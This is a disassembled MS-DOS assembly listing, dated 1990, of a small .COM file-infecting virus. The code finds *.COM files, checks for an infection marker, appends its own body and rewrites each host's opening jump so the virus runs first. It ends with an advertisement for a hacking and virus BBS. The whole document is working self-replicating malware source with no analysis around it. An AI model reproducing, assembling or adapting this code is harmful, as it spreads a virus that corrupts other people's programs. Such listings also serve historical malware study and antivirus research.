  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        S				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   4-Aug-90					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: H		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_2e		equ	1ABh			; (946E:01AB=0)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
s		proc	far
  
start:
		jmp	loc_1			; (0108)
		db	0CDh, 20h, 7, 8, 9
loc_1:
		call	sub_1			; (010B)
  
s		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		pop	si
		sub	si,10Bh
		mov	bp,data_1[si]		; (946E:01A0=0)
		add	bp,103h
		lea	dx,[si+1A2h]		; Load effective addr
		xor	cx,cx			; Zero register
		mov	ah,4Eh			; 'N'
loc_2:
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_6			; Jump if carry Set
		mov	dx,9Eh
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		mov	ah,3Fh			; '?'
		lea	dx,[si+1A8h]		; Load effective addr
		mov	di,dx
		mov	cx,3
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		cmp	byte ptr [di],0E9h
		je	loc_4			; Jump if equal
loc_3:
		mov	ah,4Fh			; 'O'
		jmp	short loc_2		; (0120)
loc_4:
		mov	dx,[di+1]
		mov	data_1[si],dx		; (946E:01A0=0)
		xor	cx,cx			; Zero register
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	dx,di
		mov	cx,2
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		cmp	word ptr [di],807h
		je	loc_3			; Jump if equal
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		mov	ax,4202h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		cmp	dx,0
		jne	loc_3			; Jump if not equal
		cmp	ah,0FEh
		jae	loc_3			; Jump if above or =
		mov	ds:data_2e[si],ax	; (946E:01AB=0)
		mov	ah,40h			; '@'
		lea	dx,[si+105h]		; Load effective addr
		mov	cx,0A3h
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jc	loc_5			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,1
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	ah,40h			; '@'
		lea	dx,[si+1ABh]		; Load effective addr
		mov	cx,2
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_5:
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_6:
		jmp	bp			;*Register jump
data_1		dw	0			; Data table (indexed access)
		db	2Ah, 2Eh, 43h, 4Fh, 4Dh, 0
sub_1		endp
  
  
seg_a		ends
  
  
  
		end	start

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

